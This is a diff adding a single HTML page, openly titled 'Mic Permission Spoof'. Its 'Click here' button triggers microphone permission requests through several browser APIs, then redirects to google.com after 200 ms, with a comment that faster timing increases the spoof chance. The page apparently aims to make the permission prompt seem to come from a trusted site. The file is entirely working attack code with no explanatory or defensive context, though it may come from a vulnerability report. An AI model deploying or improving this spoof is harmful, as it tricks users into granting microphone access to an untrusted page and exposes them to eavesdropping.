@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mic Permission Spoof</title>
+  <script>
+    function start() {
+      // Trigger mic permission using modern API
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(() => console.log("Mic allowed"))
+        .catch(() => console.log("Mic denied"));
+
+      // Optional: Trigger old method for legacy
+      if (navigator.webkitGetUserMedia) {
+        navigator.webkitGetUserMedia({ audio: true }, () => {}, () => {});
+      }
+
+      // Optional: Trigger speech recognition
+      try {
+        const recognition = new webkitSpeechRecognition();
+        recognition.start();
+      } catch (e) {}
+
+      // Redirect shortly after
+      setTimeout(() => {
+        window.location.href = "https://www.google.com";
+      }, 200); // Faster timing increases spoof chance
+    }
+  </script>
+</head>
+<body>
+  <input onclick="start()" type="button" value="Click here" />
+</body>
+</html>
